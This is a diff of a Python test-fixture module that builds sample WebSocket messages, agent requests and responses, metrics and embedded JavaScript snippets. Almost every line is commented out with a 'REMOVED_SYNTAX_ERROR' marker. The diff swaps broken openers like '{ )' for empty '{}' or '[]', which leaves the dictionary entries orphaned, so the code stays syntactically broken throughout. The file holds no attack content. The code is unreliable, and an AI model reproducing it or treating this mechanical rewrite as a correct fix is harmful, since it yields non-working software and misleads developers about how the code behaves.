@@ -115,7 +115,7 @@
     # REMOVED_SYNTAX_ERROR: @classmethod
 # REMOVED_SYNTAX_ERROR: def get_all_test_cases(cls) -> List[MessageTestCase]:
     # REMOVED_SYNTAX_ERROR: """Get all message test cases."""
-    # REMOVED_SYNTAX_ERROR: return [ )
+    # REMOVED_SYNTAX_ERROR: return []
     # Text messages
     # REMOVED_SYNTAX_ERROR: MessageTestCase( )
     # REMOVED_SYNTAX_ERROR: MessageType.TEXT_SIMPLE,
@@ -380,27 +380,27 @@
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_complex_json() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate complex JSON structure."""
-    # REMOVED_SYNTAX_ERROR: return { )
-    # REMOVED_SYNTAX_ERROR: "user": { )
+    # REMOVED_SYNTAX_ERROR: return {}
+    # REMOVED_SYNTAX_ERROR: "user": {}
     # REMOVED_SYNTAX_ERROR: "id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "name": "Test User",
-    # REMOVED_SYNTAX_ERROR: "preferences": { )
+    # REMOVED_SYNTAX_ERROR: "preferences": {}
     # REMOVED_SYNTAX_ERROR: "theme": "dark",
     # REMOVED_SYNTAX_ERROR: "language": "en",
-    # REMOVED_SYNTAX_ERROR: "notifications": { )
+    # REMOVED_SYNTAX_ERROR: "notifications": {}
     # REMOVED_SYNTAX_ERROR: "email": True,
     # REMOVED_SYNTAX_ERROR: "push": False,
     # REMOVED_SYNTAX_ERROR: "sms": True
     
     
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "session": { )
+    # REMOVED_SYNTAX_ERROR: "session": {}
     # REMOVED_SYNTAX_ERROR: "id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "created_at": datetime.now().isoformat(),
     # REMOVED_SYNTAX_ERROR: "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
     # REMOVED_SYNTAX_ERROR: "permissions": ["read", "write", "execute"]
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "metadata": { )
+    # REMOVED_SYNTAX_ERROR: "metadata": {}
     # REMOVED_SYNTAX_ERROR: "version": "1.0.0",
     # REMOVED_SYNTAX_ERROR: "client": "test-client",
     # REMOVED_SYNTAX_ERROR: "features": ["websockets", "compression", "encryption"]
@@ -413,20 +413,20 @@
 # REMOVED_SYNTAX_ERROR: def create_nested_dict(depth: int) -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: if depth <= 0:
         # REMOVED_SYNTAX_ERROR: return {"value": "formatted_string", "items": list(range(5))}
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "level": depth,
         # REMOVED_SYNTAX_ERROR: "nested": create_nested_dict(depth - 1),
         # REMOVED_SYNTAX_ERROR: "siblings": [{"id": i, "data": "formatted_string"} for i in range(3)]
         
 
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "root": create_nested_dict(8),
-        # REMOVED_SYNTAX_ERROR: "parallel_structures": { )
+        # REMOVED_SYNTAX_ERROR: "parallel_structures": {}
         # REMOVED_SYNTAX_ERROR: "tree_a": create_nested_dict(5),
         # REMOVED_SYNTAX_ERROR: "tree_b": create_nested_dict(5),
         # REMOVED_SYNTAX_ERROR: "tree_c": create_nested_dict(5)
         # REMOVED_SYNTAX_ERROR: },
-        # REMOVED_SYNTAX_ERROR: "arrays": [ )
+        # REMOVED_SYNTAX_ERROR: "arrays": []
         # REMOVED_SYNTAX_ERROR: [1, 2, [3, 4, [5, 6, [7, 8]]]],
         # REMOVED_SYNTAX_ERROR: ["a", "b", ["c", "d", ["e", "f"]]]
         
@@ -449,7 +449,7 @@
     # REMOVED_SYNTAX_ERROR: ```
 
     # REMOVED_SYNTAX_ERROR: ```javascript
-    # REMOVED_SYNTAX_ERROR: function greet(name) { )
+    # REMOVED_SYNTAX_ERROR: function greet(name) {}
     # REMOVED_SYNTAX_ERROR: console.log(`Hello, ${name}!`);
     
     # REMOVED_SYNTAX_ERROR: ```
@@ -510,13 +510,13 @@
             # REMOVED_SYNTAX_ERROR: processor = self.processors[message_type]
             # REMOVED_SYNTAX_ERROR: result = await processor(message)
 
-            # REMOVED_SYNTAX_ERROR: return { )
+            # REMOVED_SYNTAX_ERROR: return {}
             # REMOVED_SYNTAX_ERROR: "status": "success",
             # REMOVED_SYNTAX_ERROR: "result": result,
             # REMOVED_SYNTAX_ERROR: "processed_at": time.time()
             
             # REMOVED_SYNTAX_ERROR: except Exception as e:
-                # REMOVED_SYNTAX_ERROR: return { )
+                # REMOVED_SYNTAX_ERROR: return {}
                 # REMOVED_SYNTAX_ERROR: "status": "error",
                 # REMOVED_SYNTAX_ERROR: "error": str(e),
                 # REMOVED_SYNTAX_ERROR: "processed_at": time.time()
@@ -532,25 +532,25 @@
 # REMOVED_SYNTAX_ERROR: def _generate_javascript_code() -> str:
     # REMOVED_SYNTAX_ERROR: """Generate JavaScript code sample."""
     # REMOVED_SYNTAX_ERROR: return '''
-# REMOVED_SYNTAX_ERROR: class WebSocketMessageHandler { )
-# REMOVED_SYNTAX_ERROR: constructor(config = {}) { )
+# REMOVED_SYNTAX_ERROR: class WebSocketMessageHandler {}
+# REMOVED_SYNTAX_ERROR: constructor(config = {}) {}
 # REMOVED_SYNTAX_ERROR: this.config = config;
 # REMOVED_SYNTAX_ERROR: this.handlers = new Map();
 # REMOVED_SYNTAX_ERROR: this.messageQueue = [];
 
 
-# REMOVED_SYNTAX_ERROR: registerHandler(messageType, handler) { )
-# REMOVED_SYNTAX_ERROR: if (typeof handler !== 'function') { )
+# REMOVED_SYNTAX_ERROR: registerHandler(messageType, handler) {}
+# REMOVED_SYNTAX_ERROR: if (typeof handler !== 'function') {}
 # REMOVED_SYNTAX_ERROR: throw new Error('Handler must be a function');
 
 this.handlers.set(messageType, handler);
 
 
-# REMOVED_SYNTAX_ERROR: async processMessage(message) { )
-# REMOVED_SYNTAX_ERROR: try { )
+# REMOVED_SYNTAX_ERROR: async processMessage(message) {}
+# REMOVED_SYNTAX_ERROR: try {}
 # REMOVED_SYNTAX_ERROR: const { type, payload } = message;
 
-# REMOVED_SYNTAX_ERROR: if (!this.handlers.has(type)) { )
+# REMOVED_SYNTAX_ERROR: if (!this.handlers.has(type)) {}
 # REMOVED_SYNTAX_ERROR: throw new Error(`No handler for message type: ${type}`);
 
 
@@ -574,20 +574,20 @@ timestamp: Date.now()
 
 
 # REMOVED_SYNTAX_ERROR: // Queue message for batch processing
-# REMOVED_SYNTAX_ERROR: queueMessage(message) { )
-# REMOVED_SYNTAX_ERROR: this.messageQueue.push({ ))
+# REMOVED_SYNTAX_ERROR: queueMessage(message) {}
+# REMOVED_SYNTAX_ERROR: this.messageQueue.push({})
 passmessage,
 queuedAt: Date.now()
 # REMOVED_SYNTAX_ERROR: });
 
 
-# REMOVED_SYNTAX_ERROR: async processBatch() { )
+# REMOVED_SYNTAX_ERROR: async processBatch() {}
 # REMOVED_SYNTAX_ERROR: const batch = this.messageQueue.splice(0);
 # Removed problematic line: const results = await Promise.allSettled( )
 # REMOVED_SYNTAX_ERROR: batch.map(msg => this.processMessage(msg))
 # REMOVED_SYNTAX_ERROR: );
 
-# REMOVED_SYNTAX_ERROR: return results.map((result, index) => ({ )))
+# REMOVED_SYNTAX_ERROR: return results.map((result, index) => ({}))
 # REMOVED_SYNTAX_ERROR: message: batch[index],
 # REMOVED_SYNTAX_ERROR: result: result.status === 'fulfilled' ? result.value : result.reason
 # REMOVED_SYNTAX_ERROR: }));
@@ -659,13 +659,13 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: binary_data = bytes([i % 256 for i in range(1000)])
     # REMOVED_SYNTAX_ERROR: encoded_data = base64.b64encode(binary_data).decode('utf-8')
 
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "type": "binary_reference",
     # REMOVED_SYNTAX_ERROR: "encoding": "base64",
     # REMOVED_SYNTAX_ERROR: "data": encoded_data,
     # REMOVED_SYNTAX_ERROR: "size": len(binary_data),
     # REMOVED_SYNTAX_ERROR: "checksum": str(hash(binary_data)),
-    # REMOVED_SYNTAX_ERROR: "metadata": { )
+    # REMOVED_SYNTAX_ERROR: "metadata": {}
     # REMOVED_SYNTAX_ERROR: "mime_type": "application/octet-stream",
     # REMOVED_SYNTAX_ERROR: "filename": "test_data.bin",
     # REMOVED_SYNTAX_ERROR: "created_at": datetime.now().isoformat()
@@ -675,7 +675,7 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_streaming_chunk() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate streaming chunk data."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "chunk_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "sequence": random.randint(1, 100),
     # REMOVED_SYNTAX_ERROR: "total_chunks": 100,
@@ -690,13 +690,13 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: """Generate batch of messages."""
     # REMOVED_SYNTAX_ERROR: messages = []
     # REMOVED_SYNTAX_ERROR: for i in range(10):
-        # REMOVED_SYNTAX_ERROR: messages.append({ ))
+        # REMOVED_SYNTAX_ERROR: messages.append({})
         # REMOVED_SYNTAX_ERROR: "id": str(uuid.uuid4()),
         # REMOVED_SYNTAX_ERROR: "type": "formatted_string",
         # REMOVED_SYNTAX_ERROR: "content": "formatted_string",
         # REMOVED_SYNTAX_ERROR: "timestamp": datetime.now().isoformat(),
         # REMOVED_SYNTAX_ERROR: "priority": random.choice(["low", "medium", "high"]),
-        # REMOVED_SYNTAX_ERROR: "metadata": { )
+        # REMOVED_SYNTAX_ERROR: "metadata": {}
         # REMOVED_SYNTAX_ERROR: "batch_id": "test_batch_001",
         # REMOVED_SYNTAX_ERROR: "sequence": i,
         # REMOVED_SYNTAX_ERROR: "correlation_id": str(uuid.uuid4())
@@ -707,20 +707,20 @@ queuedAt: Date.now()
         # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_complex_command() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate complex command."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "command": "execute_agent_workflow",
-    # REMOVED_SYNTAX_ERROR: "args": { )
+    # REMOVED_SYNTAX_ERROR: "args": {}
     # REMOVED_SYNTAX_ERROR: "workflow_id": str(uuid.uuid4()),
-    # REMOVED_SYNTAX_ERROR: "parameters": { )
+    # REMOVED_SYNTAX_ERROR: "parameters": {}
     # REMOVED_SYNTAX_ERROR: "input_data": {"query": "test query", "context": "test context"},
-    # REMOVED_SYNTAX_ERROR: "options": { )
+    # REMOVED_SYNTAX_ERROR: "options": {}
     # REMOVED_SYNTAX_ERROR: "timeout": 30000,
     # REMOVED_SYNTAX_ERROR: "retry_count": 3,
     # REMOVED_SYNTAX_ERROR: "parallel": True,
     # REMOVED_SYNTAX_ERROR: "cache": True
     
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "callbacks": [ )
+    # REMOVED_SYNTAX_ERROR: "callbacks": []
     # REMOVED_SYNTAX_ERROR: {"event": "started", "url": "https://example.com/webhook/started"},
     # REMOVED_SYNTAX_ERROR: {"event": "completed", "url": "https://example.com/webhook/completed"}
     
@@ -728,7 +728,7 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: "user_id": "test_user_123",
     # REMOVED_SYNTAX_ERROR: "session_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "permissions": ["workflow.execute", "webhook.notify"],
-    # REMOVED_SYNTAX_ERROR: "metadata": { )
+    # REMOVED_SYNTAX_ERROR: "metadata": {}
     # REMOVED_SYNTAX_ERROR: "client_version": "1.0.0",
     # REMOVED_SYNTAX_ERROR: "user_agent": "TestClient/1.0",
     # REMOVED_SYNTAX_ERROR: "request_id": str(uuid.uuid4())
@@ -738,11 +738,11 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_system_status() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate system status message."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "system": "netra_backend",
     # REMOVED_SYNTAX_ERROR: "status": "healthy",
     # REMOVED_SYNTAX_ERROR: "timestamp": datetime.now().isoformat(),
-    # REMOVED_SYNTAX_ERROR: "metrics": { )
+    # REMOVED_SYNTAX_ERROR: "metrics": {}
     # REMOVED_SYNTAX_ERROR: "cpu_usage": random.uniform(10, 80),
     # REMOVED_SYNTAX_ERROR: "memory_usage": random.uniform(30, 90),
     # REMOVED_SYNTAX_ERROR: "disk_usage": random.uniform(20, 70),
@@ -750,13 +750,13 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: "messages_per_second": random.randint(10, 1000),
     # REMOVED_SYNTAX_ERROR: "error_rate": random.uniform(0, 5)
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "services": { )
+    # REMOVED_SYNTAX_ERROR: "services": {}
     # REMOVED_SYNTAX_ERROR: "websocket_manager": {"status": "running", "connections": 45},
     # REMOVED_SYNTAX_ERROR: "agent_registry": {"status": "running", "agents": 12},
     # REMOVED_SYNTAX_ERROR: "tool_dispatcher": {"status": "running", "queue_size": 3},
     # REMOVED_SYNTAX_ERROR: "llm_manager": {"status": "running", "requests_pending": 8}
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "alerts": [ )
+    # REMOVED_SYNTAX_ERROR: "alerts": []
     # REMOVED_SYNTAX_ERROR: {"level": "info", "message": "System running normally"},
     # REMOVED_SYNTAX_ERROR: {"level": "warning", "message": "High CPU usage detected"}
     
@@ -765,13 +765,13 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_debug_message() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate debug message with potential sensitive data."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "level": "debug",
     # REMOVED_SYNTAX_ERROR: "module": "websocket_manager",
     # REMOVED_SYNTAX_ERROR: "function": "process_message",
     # REMOVED_SYNTAX_ERROR: "line": 245,
     # REMOVED_SYNTAX_ERROR: "message": "Processing message with validation",
-    # REMOVED_SYNTAX_ERROR: "variables": { )
+    # REMOVED_SYNTAX_ERROR: "variables": {}
     # REMOVED_SYNTAX_ERROR: "message_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "user_id": "user_123",  # Potentially sensitive
     # REMOVED_SYNTAX_ERROR: "connection_id": "conn_456",
@@ -779,12 +779,12 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: "payload_size": 1024,
     # REMOVED_SYNTAX_ERROR: "processing_time_ms": 45.2
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "stack_trace": [ )
+    # REMOVED_SYNTAX_ERROR: "stack_trace": []
     # REMOVED_SYNTAX_ERROR: "websocket_manager.py:245 in process_message",
     # REMOVED_SYNTAX_ERROR: "message_validator.py:67 in validate",
     # REMOVED_SYNTAX_ERROR: "schema_validator.py:89 in check_schema"
     # REMOVED_SYNTAX_ERROR: ],
-    # REMOVED_SYNTAX_ERROR: "context": { )
+    # REMOVED_SYNTAX_ERROR: "context": {}
     # REMOVED_SYNTAX_ERROR: "thread_id": threading.current_thread().ident,
     # REMOVED_SYNTAX_ERROR: "timestamp": time.time(),
     # REMOVED_SYNTAX_ERROR: "session_data": {"key": "potentially_sensitive_value"}
@@ -794,30 +794,30 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_agent_request() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate agent request message."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "type": "agent_request",
     # REMOVED_SYNTAX_ERROR: "agent_type": "research_agent",
     # REMOVED_SYNTAX_ERROR: "request_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "user_id": "test_user",
     # REMOVED_SYNTAX_ERROR: "thread_id": str(uuid.uuid4()),
-    # REMOVED_SYNTAX_ERROR: "task": { )
+    # REMOVED_SYNTAX_ERROR: "task": {}
     # REMOVED_SYNTAX_ERROR: "instruction": "Research the latest developments in WebSocket technology",
     # REMOVED_SYNTAX_ERROR: "context": "User is building a real-time application",
-    # REMOVED_SYNTAX_ERROR: "constraints": { )
+    # REMOVED_SYNTAX_ERROR: "constraints": {}
     # REMOVED_SYNTAX_ERROR: "max_time_seconds": 300,
     # REMOVED_SYNTAX_ERROR: "max_tokens": 2000,
     # REMOVED_SYNTAX_ERROR: "sources": ["web", "documentation", "papers"]
     
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "preferences": { )
+    # REMOVED_SYNTAX_ERROR: "preferences": {}
     # REMOVED_SYNTAX_ERROR: "detail_level": "comprehensive",
     # REMOVED_SYNTAX_ERROR: "format": "markdown",
     # REMOVED_SYNTAX_ERROR: "include_sources": True
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "metadata": { )
+    # REMOVED_SYNTAX_ERROR: "metadata": {}
     # REMOVED_SYNTAX_ERROR: "priority": "high",
     # REMOVED_SYNTAX_ERROR: "estimated_complexity": "medium",
-    # REMOVED_SYNTAX_ERROR: "user_context": { )
+    # REMOVED_SYNTAX_ERROR: "user_context": {}
     # REMOVED_SYNTAX_ERROR: "expertise_level": "intermediate",
     # REMOVED_SYNTAX_ERROR: "preferred_language": "en"
     
@@ -827,12 +827,12 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_agent_response() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate agent response message."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "type": "agent_response",
     # REMOVED_SYNTAX_ERROR: "request_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "agent_type": "research_agent",
     # REMOVED_SYNTAX_ERROR: "status": "completed",
-    # REMOVED_SYNTAX_ERROR: "response": { )
+    # REMOVED_SYNTAX_ERROR: "response": {}
     # REMOVED_SYNTAX_ERROR: "summary": "WebSocket technology has evolved significantly with HTTP/3 and WebRTC integration.",
     # REMOVED_SYNTAX_ERROR: "content": "# WebSocket Technology Developments
 
@@ -858,19 +858,19 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: - Backward compatibility maintained
     # REMOVED_SYNTAX_ERROR: - Progressive enhancement strategies
     # REMOVED_SYNTAX_ERROR: - Security considerations for new features",
-    # REMOVED_SYNTAX_ERROR: "sources": [ )
+    # REMOVED_SYNTAX_ERROR: "sources": []
     # REMOVED_SYNTAX_ERROR: {"title": "WebSocket Protocol RFC 6455", "url": "https://tools.ietf.org/rfc/rfc6455.txt"},
     # REMOVED_SYNTAX_ERROR: {"title": "HTTP/3 and WebSockets", "url": "https://example.com/http3-websockets"},
     # REMOVED_SYNTAX_ERROR: {"title": "WebRTC Integration Guide", "url": "https://example.com/webrtc-guide"}
     
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "metrics": { )
+    # REMOVED_SYNTAX_ERROR: "metrics": {}
     # REMOVED_SYNTAX_ERROR: "processing_time_ms": 2345.6,
     # REMOVED_SYNTAX_ERROR: "tokens_used": 1567,
     # REMOVED_SYNTAX_ERROR: "sources_consulted": 15,
     # REMOVED_SYNTAX_ERROR: "confidence_score": 0.92
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "metadata": { )
+    # REMOVED_SYNTAX_ERROR: "metadata": {}
     # REMOVED_SYNTAX_ERROR: "completion_timestamp": datetime.now().isoformat(),
     # REMOVED_SYNTAX_ERROR: "model_version": "research-agent-v2.1",
     # REMOVED_SYNTAX_ERROR: "quality_score": 0.95
@@ -880,33 +880,33 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_tool_execution() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate tool execution message."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "type": "tool_execution",
     # REMOVED_SYNTAX_ERROR: "tool_name": "web_search",
     # REMOVED_SYNTAX_ERROR: "execution_id": str(uuid.uuid4()),
-    # REMOVED_SYNTAX_ERROR: "request": { )
+    # REMOVED_SYNTAX_ERROR: "request": {}
     # REMOVED_SYNTAX_ERROR: "action": "search",
-    # REMOVED_SYNTAX_ERROR: "parameters": { )
+    # REMOVED_SYNTAX_ERROR: "parameters": {}
     # REMOVED_SYNTAX_ERROR: "query": "WebSocket performance optimization",
     # REMOVED_SYNTAX_ERROR: "max_results": 10,
     # REMOVED_SYNTAX_ERROR: "include_snippets": True,
     # REMOVED_SYNTAX_ERROR: "date_filter": "recent"
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "context": { )
+    # REMOVED_SYNTAX_ERROR: "context": {}
     # REMOVED_SYNTAX_ERROR: "user_intent": "research",
     # REMOVED_SYNTAX_ERROR: "domain": "technology"
     
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "response": { )
+    # REMOVED_SYNTAX_ERROR: "response": {}
     # REMOVED_SYNTAX_ERROR: "status": "success",
-    # REMOVED_SYNTAX_ERROR: "results": [ )
-    # REMOVED_SYNTAX_ERROR: { )
+    # REMOVED_SYNTAX_ERROR: "results": []
+    # REMOVED_SYNTAX_ERROR: {}
     # REMOVED_SYNTAX_ERROR: "title": "WebSocket Performance Best Practices",
     # REMOVED_SYNTAX_ERROR: "url": "https://example.com/websocket-performance",
     # REMOVED_SYNTAX_ERROR: "snippet": "Optimizing WebSocket connections for high-performance applications...",
     # REMOVED_SYNTAX_ERROR: "relevance_score": 0.95
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: { )
+    # REMOVED_SYNTAX_ERROR: {}
     # REMOVED_SYNTAX_ERROR: "title": "Scaling WebSocket Applications",
     # REMOVED_SYNTAX_ERROR: "url": "https://example.com/scaling-websockets",
     # REMOVED_SYNTAX_ERROR: "snippet": "Techniques for handling thousands of concurrent WebSocket connections...",
@@ -916,11 +916,11 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: "total_results": 10,
     # REMOVED_SYNTAX_ERROR: "search_time_ms": 234.5
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "execution_metrics": { )
+    # REMOVED_SYNTAX_ERROR: "execution_metrics": {}
     # REMOVED_SYNTAX_ERROR: "start_time": datetime.now().isoformat(),
     # REMOVED_SYNTAX_ERROR: "end_time": (datetime.now() + timedelta(milliseconds=500)).isoformat(),
     # REMOVED_SYNTAX_ERROR: "duration_ms": 500.0,
-    # REMOVED_SYNTAX_ERROR: "resource_usage": { )
+    # REMOVED_SYNTAX_ERROR: "resource_usage": {}
     # REMOVED_SYNTAX_ERROR: "cpu_time_ms": 45.2,
     # REMOVED_SYNTAX_ERROR: "memory_mb": 12.8,
     # REMOVED_SYNTAX_ERROR: "network_requests": 3
@@ -931,27 +931,27 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_metrics_data() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate metrics data."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "type": "metrics",
     # REMOVED_SYNTAX_ERROR: "service": "websocket_manager",
     # REMOVED_SYNTAX_ERROR: "timestamp": datetime.now().isoformat(),
     # REMOVED_SYNTAX_ERROR: "interval_seconds": 60,
-    # REMOVED_SYNTAX_ERROR: "metrics": { )
-    # REMOVED_SYNTAX_ERROR: "connections": { )
+    # REMOVED_SYNTAX_ERROR: "metrics": {}
+    # REMOVED_SYNTAX_ERROR: "connections": {}
     # REMOVED_SYNTAX_ERROR: "total": 145,
     # REMOVED_SYNTAX_ERROR: "active": 132,
     # REMOVED_SYNTAX_ERROR: "idle": 13,
     # REMOVED_SYNTAX_ERROR: "connecting": 2,
     # REMOVED_SYNTAX_ERROR: "disconnecting": 1
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "messages": { )
+    # REMOVED_SYNTAX_ERROR: "messages": {}
     # REMOVED_SYNTAX_ERROR: "sent": 5439,
     # REMOVED_SYNTAX_ERROR: "received": 5124,
     # REMOVED_SYNTAX_ERROR: "queued": 23,
     # REMOVED_SYNTAX_ERROR: "failed": 12,
     # REMOVED_SYNTAX_ERROR: "retried": 8
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "performance": { )
+    # REMOVED_SYNTAX_ERROR: "performance": {}
     # REMOVED_SYNTAX_ERROR: "avg_latency_ms": 45.6,
     # REMOVED_SYNTAX_ERROR: "p95_latency_ms": 89.2,
     # REMOVED_SYNTAX_ERROR: "p99_latency_ms": 156.7,
@@ -959,7 +959,7 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: "cpu_usage_percent": 34.2,
     # REMOVED_SYNTAX_ERROR: "memory_usage_mb": 89.6
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "errors": { )
+    # REMOVED_SYNTAX_ERROR: "errors": {}
     # REMOVED_SYNTAX_ERROR: "connection_errors": 3,
     # REMOVED_SYNTAX_ERROR: "message_validation_errors": 2,
     # REMOVED_SYNTAX_ERROR: "timeout_errors": 1,
@@ -967,8 +967,8 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: "rate_limit_errors": 1
     
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "alerts": [ )
-    # REMOVED_SYNTAX_ERROR: { )
+    # REMOVED_SYNTAX_ERROR: "alerts": []
+    # REMOVED_SYNTAX_ERROR: {}
     # REMOVED_SYNTAX_ERROR: "level": "warning",
     # REMOVED_SYNTAX_ERROR: "metric": "p99_latency_ms",
     # REMOVED_SYNTAX_ERROR: "threshold": 150.0,
@@ -981,25 +981,25 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: @staticmethod
 # REMOVED_SYNTAX_ERROR: def _generate_event_notification() -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Generate event notification."""
-    # REMOVED_SYNTAX_ERROR: return { )
+    # REMOVED_SYNTAX_ERROR: return {}
     # REMOVED_SYNTAX_ERROR: "type": "event_notification",
     # REMOVED_SYNTAX_ERROR: "event_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "event_type": "agent_completed",
     # REMOVED_SYNTAX_ERROR: "source": "agent_registry",
     # REMOVED_SYNTAX_ERROR: "timestamp": datetime.now().isoformat(),
-    # REMOVED_SYNTAX_ERROR: "payload": { )
+    # REMOVED_SYNTAX_ERROR: "payload": {}
     # REMOVED_SYNTAX_ERROR: "agent_id": "research_agent_001",
     # REMOVED_SYNTAX_ERROR: "request_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "status": "success",
     # REMOVED_SYNTAX_ERROR: "duration_ms": 5432.1,
     # REMOVED_SYNTAX_ERROR: "result_summary": "Research task completed successfully"
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "routing": { )
+    # REMOVED_SYNTAX_ERROR: "routing": {}
     # REMOVED_SYNTAX_ERROR: "targets": ["websocket_notifier", "metrics_collector", "audit_logger"],
     # REMOVED_SYNTAX_ERROR: "priority": "normal",
     # REMOVED_SYNTAX_ERROR: "delivery_mode": "broadcast"
     # REMOVED_SYNTAX_ERROR: },
-    # REMOVED_SYNTAX_ERROR: "metadata": { )
+    # REMOVED_SYNTAX_ERROR: "metadata": {}
     # REMOVED_SYNTAX_ERROR: "correlation_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "causation_id": str(uuid.uuid4()),
     # REMOVED_SYNTAX_ERROR: "version": "1.0",
@@ -1011,7 +1011,7 @@ queuedAt: Date.now()
 # REMOVED_SYNTAX_ERROR: def _generate_compressible_data() -> str:
     # REMOVED_SYNTAX_ERROR: """Generate highly compressible data for compression testing."""
     # Create highly repetitive data that compresses well
-    # REMOVED_SYNTAX_ERROR: patterns = [ )
+    # REMOVED_SYNTAX_ERROR: patterns = []
     # REMOVED_SYNTAX_ERROR: "The quick brown fox jumps over the lazy dog. ",
     # REMOVED_SYNTAX_ERROR: "Lorem ipsum dolor sit amet, consectetur adipiscing elit. ",
